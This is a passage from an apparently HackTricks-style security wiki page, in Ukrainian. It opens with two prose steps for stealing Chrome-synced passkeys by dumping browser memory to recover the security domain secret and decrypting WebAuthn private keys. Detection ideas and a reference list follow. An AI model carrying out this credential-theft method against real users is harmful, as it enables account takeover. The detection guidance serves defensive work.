   - Відстежуйте повторне створення/зміну `passkey_enclave_state`, а потім зніміть дамп пам’яті Chrome, поки відкритий текст **секрету домену безпеки (SDS)** перебуває в пам’яті.
   - Використайте відновлений SDS, щоб розшифрувати зашифровані поля в кожному записі `WebauthnCredentialSpecifics` і відновити портативні приватні ключі WebAuthn.

### Ідеї для DFIR / виявлення

- Відстежуйте **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Сповіщайте про аномальний доступ сторонніх процесів до Chrome **`Sync Data\LevelDB`**.
- Сповіщайте про **дампи пам’яті Chrome** або підозрілий доступ до пам’яті між процесами.
- Розслідуйте повторювані запити PIN-коду для відновлення **Google Password Manager** або неочікуване повторне налаштування.
- Пам’ятайте, що WebAuthn **`signCount`** часто не допомагає виявити синхронізовані passkey, оскільки його значення може залишатися незмінним, тож класичне виявлення клонів малоефективне.

## References

- [1] [Unit 42 – Розслідування багаторічних непомічених операцій, спрямованих на критично важливі сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA по SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Усередині Ink Dragon: викриття ретрансляційної мережі та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова поверхня атаки в автентифікації без пароля](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / сховище ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: атаки на системи та мережі Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: усередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – віддалене отримання паролів із дампу LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho розширює свій арсенал кібершпигунства за допомогою набору інструментів Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функція CreateFileW і `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – режим резервного копіювання Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegram – завершення активних сеансів](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard і Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: захист облікових даних та керування ними](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
